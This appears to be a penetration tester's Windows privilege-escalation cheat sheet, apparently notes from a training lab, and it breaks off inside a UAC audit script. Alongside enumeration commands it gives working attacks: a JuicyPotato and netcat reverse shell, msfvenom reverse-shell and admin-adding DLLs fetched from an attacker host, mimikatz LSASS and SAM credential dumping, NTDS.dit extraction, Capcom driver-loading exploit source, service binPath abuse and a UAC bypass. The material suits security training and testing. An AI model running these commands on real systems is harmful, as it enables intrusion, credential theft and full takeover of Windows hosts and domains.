# System Info
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

# Kernel Update
```powershell
wmic qfe
Get-HotFix | ft -AutoSize
```

# OS Information
```powershell
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

# Environment
```powershell
set
Get-ChildItem Env: | ft Key,Value
```

# Installed Programs
```powershell
wmic product get name
Get-WmiObject -Class Win32_Product |  select Name, Version
```

# Services
```powershell
Get-Process -Id (Get-NetTCPConnection -LocalPort 8080).OwningProcess | Select-Object Id, ProcessName, Description, Path
```

# Drives
```powershell
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```





# Get current username
```powershell
echo %USERNAME% || whoami
$env:username
```

# List user privilege
```powershell
whoami /priv
whoami /groups
```

# List all users
```powershell
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

# List logon requirements; useable for bruteforcing
```powershell
$env:usernadsc
net accounts
```

# Get details about a user
```powershell
net user administrator
net user admin
net user %USERNAME%
```

# Entry Types
```powershell
takeown /f C:\Windows\System32\Winevt\Logs\Security.evtx

icacls C:\Windows\System32\Winevt\Logs\Security.evtx /grant htb-student:F


Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624]]" -MaxEvents 50 | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $TargetUserName = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq "TargetUserName"})."#text"
    $LogonType = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq "LogonType"})."#text"
    $IpAddress = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq "IpAddress"})."#text"
    
    # Sistem hesablarını süzgəcdən keçiririk ki, yalnız real istifadəçilər qalsın
    if ($TargetUserName -notmatch "SYSTEM|ANONYMOUS|LOCAL SERVICE|NETWORK SERVICE|Window$") {
        [PSCustomObject]@{
            "Time"             = $_.TimeCreated
            "Username"    = $TargetUserName
            "Entry Type"  = $LogonType
            "IP Address"         = $IpAddress
        }
    }
} | Format-Table -AutoSize
```

# List all local groups
```powershell
net localgroup
Get-LocalGroup | ft Name
```

# Get details about a group
```powershell
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
```

# Get Domain Controllers
```powershell
nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
```




# List all network interfaces, IP, and DNS.
```powershell
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

# List current routing table
```powershell
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

# List the ARP table
```powershell
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

# List all current connections
```powershell
netstat -ano
```

# List all network shares
```powershell
net share
powershell Find-DomainShare -ComputerDomain domain.local
```

# SNMP Configuration
```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```




# Enumerate antivirus
```powershell
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

# AppLocker
```powershell
Get-MpComputerStatus
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Test Applocker Policy
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

# AppLocker Show Executable Files
```powershell
[xml]$policy = Get-AppLockerPolicy -Effective -Xml
$policy.AppLockerPolicy.RuleCollection | ForEach-Object {
    $Type = $_.Type
    $_.GetElementsByTagName("FilePathCondition") | ForEach-Object {
        [PSCustomObject]@{
            "Rule Type" = $Type
            "File / Path"  = $_.Path
            "Action"     = $_.ParentNode.ParentNode.Action
            "Name"        = $_.ParentNode.ParentNode.Name
        }
    }
} | Format-Table -AutoSize
```




# Default Writable Folders
```powershell
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp
```

# SAM and SYSTEM files
```powershell
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt

john -format=NT /root/sam.txt
```

# HiveNightmare
```powershell
icacls config\SAM
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!

mimikatz> token::whoami /full

# List shadow copies available
mimikatz> misc::shadowcopies

# Extract account from SAM databases
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

# Extract secrets from SECURITY
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```

# LAPS Dumping
```powershell
https://github.com/SnaffCon/Snaffler

HKLM\Software\Policies\Microsoft Services\AdmPwd

LAPS Enabled: AdmPwdEnabled
LAPS Admin Account Name: AdminAccountName
LAPS Password Complexity: PasswordComplexity
LAPS Password Length: PasswordLength
LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled

cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
findstr /spin "password" *.*


$token = (.\GetBearerToken.exe https://your.sharepoint.com)
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals
$token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com")

.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token
.\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config"
```

# Search for a file with a certain filename
```powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

# Search the registry for key names and passwords
```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

# Passwords in unattend.xml
```powershell
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

# IIS Web config
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

# Other Files
```powershell
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
```

# WIFI Passwords
```powershell
netsh wlan show profile
netsh wlan show profile <SSID> key=clear

cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

# Sticky Notes
```powershell
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

# Key Manager
```powershell
rundll32 keymgr,KRShowKeyMgr
```

# Powershell History
```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

# Powershell Transcript
```powershell
C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
```

# Password in Alternate Data Stream
```powershell
PS > Get-Item -path flag.txt -Stream *
PS > Get-Content -path flag.txt -Stream Flag
```





# Process
```powershell
netstat -ano
tasklist /FI "PID eq <PID_NUMBER>"

tasklist /v
net start
sc query
Get-Service
Get-Process
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
```

# Run as SYSTEM
```powershell
tasklist /v /fi "username eq system"
```

# Installed Programs
```powershell
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

# List Services
```powershell
net start
wmic service list brief
tasklist /SVC
```

# Enumerate Scheduled Tasks
```powershell
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

# Startup Tasks
```powershell
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```

# Pipe Files
```powershell
pipelist.exe /accepteula

# With Powershell
gci \\.\pipe\
[System.IO.Directory]::GetFiles("\\.\\pipe\\") | Select-String "SQL"

# Konkret pipe
accesschk.exe /accepteula \\.\Pipe\lsass -v

# Hamısını yoxla
accesschk.exe /accepteula \pipe\* -v

# Yalnız yazılabilənləri göstər
accesschk.exe -w \pipe\* -v

FILE_READ_DATA     Pipe-dan oxu
FILE_WRITE_DATA    Pipe-a yaz
FILE_ALL_ACCESS    Tam giriş (təhlükəli!)
READ_CONTROL       DACL-ı oxu
SYNCHRONIZE        Sinxronizasiya
```





# User Rights Assignment
```powershell
RUN AS ADMINISTRATOR
whoami /priv

SeDebugPrivilege
SeTcbPrivilege
SeImpersonatePrivilege
SeLoadDriverPrivilege
SeBackupPrivilege
SeTakeOwnershipPrivilege
```

# Disabled Privilege --> ENABLED
```powershell
# Bu daxili funksiya göstərilən hüququ dərhal 'Enabled' vəziyyətinə gətirir
function Enable-Privilege ([string]$privilegeName) {
    $type = Add-Type -PassThru -TypeName "Win32Privs" -MemberDefinition @'
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        
        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
        
        public struct TOKEN_PRIVILEGES {
            public uint PrivilegeCount;
            public long Luid;
            public uint Attributes;
        }
'@
}


#
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

# SeImpersonate and SeAssignPrimaryToken
```powershell
# Juicy Potato
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
sudo nc -lnvp 8443
```

# SeDebugPrivilege
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

Ctrl + Shift + ESC --> lsass.exe --> Create Dump File
```

# SeTakeOwnershipPrivilege
```powershell
takeown /f C:\Windows\NTDS\ntds.dit
icacls C:\Windows\NTDS\ntds.dit /grant %username%:F
vssadmin create shadow /for=C:
```

# SeBackupPrivilege
```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Copying NTDS.dit
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

# Secretsdump
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

# SeLoadDriverPrivilege
[Print Operators](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Privilege%20Escalation/Windows/11-Print%20Operators.md)

# SeRestorePrivilege
[Server Operators]()





# Group Enumeration
```powershell
net localgroup "Event Log Readers"
```

# Searching Security Logs Using wevtutil
```powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

# Passing Credentials to wevtutil
```powershell
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

# Searching Security Logs Using Get-WinEvent
```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```




# Generating Malicious DLL
```powershell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

# Loading DLL as Non-Privileged User
```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

# Finding User's SID
```powershell
(Get-ADUser -Identity "netadm").SID.Value
```

# Checking Permissions on DNS Service
```powershell
sc.exe sdshow DNS


# Input SDDL string from your prompt
$sddl = "D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)"
# Service Rights Dictionary
$rightsDict = @{
    "CC" = "Read Service Configuration (SERVICE_QUERY_CONFIG)"
    "LC" = "Query Service Status (SERVICE_QUERY_STATUS)"
    "SW" = "Enumerate Service Dependencies (SERVICE_ENUMERATE_DEPENDENTS)"
    "LO" = "Interrogate Service Logs (SERVICE_INTERROGATE)"
    "CR" = "Query User-Defined Controls (SERVICE_USER_DEFINED_CONTROL)"
    "RC" = "Read Security Descriptor (READ_CONTROL)"
    "RP" = "START the Service (SERVICE_START)"
    "WP" = "STOP the Service (SERVICE_STOP)"
    "DT" = "Pause/Continue the Service (SERVICE_PAUSE_CONTINUE)"
    "DC" = "Change Service Configuration (SERVICE_CHANGE_CONFIG)"
    "WD" = "Change Owner (WRITE_OWNER)"
    "WO" = "Modify Permissions / DACL (WRITE_DAC)"
    "SD" = "Delete the Service (DELETE)"
}

# Standard Trustee/Principal Dictionary
$trusteesDict = @{
    "IU" = "Interactive Users (Users logged into the machine)"
    "SU" = "Service Users (Accounts running background services)"
    "SY" = "Local System (NT AUTHORITY\SYSTEM)"
    "BA" = "Built-in Administrators"
    "SO" = "Server Operators"
}

# Extract individual Access Control Entries (ACE)
$aces = $sddl -split '\)' | ForEach-Object { $_.TrimStart('D:').TrimStart('(') } | Where-Object { $_ -ne "" }

Write-Host "================== DNS SERVICE PERMISSIONS ==================" -ForegroundColor Cyan

foreach ($ace in $aces) {
    $parts = $ace -split ';'
    if ($parts.Count -ge 6) {
        $type = $parts[0] # A = Allow
        $rightsRaw = $parts[2]
        $trusteeRaw = $parts[5]

        # Resolve Trustee (User/Group)
        if ($trusteesDict.ContainsKey($trusteeRaw)) {
            $trustee = $trusteesDict[$trusteeRaw]
        } else {
            $trustee = "Specific SID / User Account ($trusteeRaw)"
        }

        Write-Host "`nTarget: $trustee" -ForegroundColor Yellow
        Write-Host "Action: " -NoNewline; Write-Host "ALLOW" -ForegroundColor Green

        # Parse Rights (2 characters each)
        Write-Host "Rights Granted:"
        for ($i = 0; $i -lt $rightsRaw.Length; $i += 2) {
            $right = $rightsRaw.Substring($i, 2)
            if ($rightsDict.ContainsKey($right)) {
                Write-Host "  - $($rightsDict[$right])" -ForegroundColor Gray
            } else {
                Write-Host "  - Unknown Permission ($right)" -ForegroundColor Red
            }
        }
    }
}
Write-Host "`n===========================================================" -ForegroundColor Cyan
```

# Stopping the DNS Service
```powershell
Stop-Service -Name "DNS" -Force
Start-Service -Name "DNS"
```

# Confirming Group Membership
```powershell
net group "Domain Admins" /dom
```

# Start new Session
```powershell
Start-Process powershell -Credential (Get-Credential)
```





# Confirming Privileges
```powershell
whoami /priv
SeLoadDriverPrivilege
```

# Compile with cl.exe
```powershell
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

.\EnableSeLoadDriverPrivilege.exe
```

# Add Reference to Driver
```powershell
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

# List Drivers
```powershell
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

# Use ExploitCapcom Tool to Escalate Privileges
```powershell
.\ExploitCapcom.exe
```

# Automation
```powershell
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
.\ExploitCapcom.exe
```

# EnableSeLoadDriverPrivilege
```powershell
/*
Reference:
https://github.com/hatRiot/token-priv
https://github.com/TarlogicSecurity/EoPLoadDriver

Enable the SeLoadDriverPrivilege of current process and then load the driver into the kernel.

First you need to add two reg keys,the command is:
reg add hkcu\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\test\Capcom.sys"
reg add hkcu\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
Then run me to load the driver(C:\test\Capcom.sys) into the kernel.

We will have all access on the system.
*/


#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#pragma comment(lib,"advapi32.lib") 
#pragma comment(lib,"user32.lib") 
#pragma comment(lib,"Ntdll.lib")


LPWSTR getUserSid(HANDLE hToken)
{

	// Get the size of the memory buffer needed for the SID
	//https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral
	//https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx

	DWORD dwBufferSize = 0;
	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize) &&
		(GetLastError() != ERROR_INSUFFICIENT_BUFFER))
	{
		wprintf(L"GetTokenInformation failed, error: %d\n",
			GetLastError());
		return NULL;
	}

	//https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral
	PTOKEN_USER pUserToken = (PTOKEN_USER)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		dwBufferSize);

	if (pUserToken == NULL) {
		HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);
		return NULL;
	}

	// Retrive token info
	if (!GetTokenInformation(
		hToken,
		TokenUser,
		pUserToken,
		dwBufferSize,
		&dwBufferSize))
	{
		GetLastError();
		return NULL;
	}

	// Check if SID is valid
	if (!IsValidSid(pUserToken->User.Sid))
	{
		wprintf(L"The owner SID is invalid.\n");
		return NULL;
	}

	LPWSTR sidString;
	ConvertSidToStringSidW(pUserToken->User.Sid, &sidString);
	return sidString;
}

ULONG
LoadDriver(HANDLE hToken)
{
	UNICODE_STRING DriverServiceName;
	ULONG dwErrorCode;
	NTSTATUS status;

	typedef NTSTATUS(_stdcall *NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
	typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);

	NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver");
	RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

	LPWSTR win7regPath = new WCHAR[MAX_PATH];
	ZeroMemory(win7regPath, MAX_PATH);
	LPWSTR userSidStr;
	userSidStr = getUserSid(hToken);
	if (userSidStr == NULL)
	{
		wprintf(L"[+] Error while getting user SID\n");
		CloseHandle(hToken);
		hToken = NULL;
	}

	lstrcat(win7regPath, L"\\Registry\\User\\");
	lstrcat(win7regPath, userSidStr);
	lstrcat(win7regPath, L"\\System\\CurrentControlSet\\CAPCOM");

	RtlInitUnicodeString(&DriverServiceName, win7regPath);

	status = NtLoadDriver(&DriverServiceName);
	printf("NTSTATUS: %08x, WinError: %d\n", status, GetLastError());

	if (!NT_SUCCESS(status))
		return RtlNtStatusToDosError(status);

	return 0;
}

int IsTokenSystem(HANDLE tok)
{
	DWORD Size, UserSize, DomainSize;
	SID *sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER *User;
	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return 0;

	User = (TOKEN_USER *)malloc(Size);
	assert(User);
	GetTokenInformation(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID *)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof *UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf("whoami:\n%S\\%S\n", DomainName, UserName);
	if (!_wcsicmp(UserName, L"SYSTEM"))
		return 0;
	return 1;
}

VOID RetPrivDwordAttributesToStr(DWORD attributes, LPTSTR szAttrbutes)
{
	UINT len = 0;
	if (attributes & SE_PRIVILEGE_ENABLED)
		len += wsprintf(szAttrbutes, TEXT("Enabled"));
	if (attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
		len += wsprintf(szAttrbutes, TEXT("Enabled by default"));
	if (attributes & SE_PRIVILEGE_REMOVED)
		len += wsprintf(szAttrbutes, TEXT("Removed"));
	if (attributes & SE_PRIVILEGE_USED_FOR_ACCESS)
		len += wsprintf(szAttrbutes, TEXT("Used for access"));
	if (szAttrbutes[0] == 0)
		wsprintf(szAttrbutes, TEXT("Disabled"));
	return;
}

int GetTokenPrivilege(HANDLE tok)
{
	PTOKEN_PRIVILEGES ppriv = NULL;
	DWORD dwRet = 0;
	GetTokenInformation(tok, TokenGroups, ppriv, dwRet, &dwRet);
	if (!dwRet)
		return 0;
	ppriv = (PTOKEN_PRIVILEGES)calloc(dwRet, 1);
	GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &dwRet);
	printf("\nwhoami /priv\n");
	for (int i = 0; i < ppriv->PrivilegeCount; i++)
	{
		TCHAR lpszPriv[MAX_PATH] = { 0 };
		DWORD dwRet = MAX_PATH;
		BOOL n = LookupPrivilegeName(NULL, &(ppriv->Privileges[i].Luid), lpszPriv, &dwRet);
		printf("%-50ws", lpszPriv);
		TCHAR lpszAttrbutes[1024] = { 0 };
		RetPrivDwordAttributesToStr(ppriv->Privileges[i].Attributes, lpszAttrbutes);
		printf("%ws\n", lpszAttrbutes);
	}
	return 1;
}

BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
{

	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("[!]LookupPrivilegeValue error\n");
		return 0;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
	{
		printf("[!]AdjustTokenPrivileges error\n");
		return 0;
	}

	IsTokenSystem(hToken);
	GetTokenPrivilege(hToken);

	return TRUE;
}

int _tmain(int argc, _TCHAR* argv[])
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		printf("[!]OpenProcessToken error\n");
		return 0;
	}

	EnablePriv(hToken, SE_LOAD_DRIVER_NAME);
	LoadDriver(hToken);
	return 0;
}
```





# Checking Service Permissions with PsService
```powershell
PsService.exe security AppReadiness

[ALLOW] BUILTIN\Server Operators
                All
```

# Checking Local Admin Group Membership
```powershell
net localgroup Administrators
```

# Modifying the Service Binary Path
```powershell
sc.exe config AppReadiness binPath= "cmd.exe /c net user oxsium AdminPass123! /add && net localgroup Administrators oxsium /add"
```

# Starting the Service
```powershell
sc.exe start AppReadiness
net localgroup Administrators
```

# Dump SAM and SECURITY
```powershell
reg save HKLM\SAM C:\Tools\sam.hiv
reg save HKLM\SYSTEM C:\Tools\system.hiv

impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
```

# Confirming Local Admin Access on Domain Controller
```powershell
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```





# Check Groups
```powershell
whoami /groups

Administrator AND Medium Integrity 
```

# Creating Malicious DLL and Download
```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"

nc -lvnp 8443
```

# Trigger and Bypass UAC
```powershell
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

# Check Regitries
```powershell
# Windows UAC & Token Policy Security Audit Script
Clear-Host
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "     WINDOWS UAC & REGISTRY SECURITY AUDIT REPORT        " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host ""

$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

# Array of policies, their secure baseline values, and technical descriptions
$Policies = @(
    @{ Name = "EnableLUA"; SecureValue = 1; Desc = "Overall UAC Mechanism Status" },
